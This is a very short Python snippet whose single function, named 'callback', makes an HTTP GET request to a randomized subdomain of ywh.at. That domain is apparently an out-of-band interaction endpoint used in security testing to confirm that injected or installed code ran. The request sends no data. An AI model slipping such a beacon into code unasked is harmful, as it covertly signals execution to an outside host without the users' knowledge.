import requests

def callback():
    requests.get("https://0abhjbkjgw63avm5jtogkd3tjkpode13.i.ywh.at")

